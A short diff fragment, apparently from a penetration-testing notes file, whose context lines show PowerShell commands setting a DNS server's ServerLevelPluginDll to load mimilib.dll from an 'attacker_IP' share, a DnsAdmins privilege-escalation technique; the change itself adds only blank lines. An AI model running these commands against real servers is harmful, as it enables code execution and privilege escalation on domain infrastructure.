@@ -21,3 +21,5 @@ $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
 $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
 Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
 ```
+
+
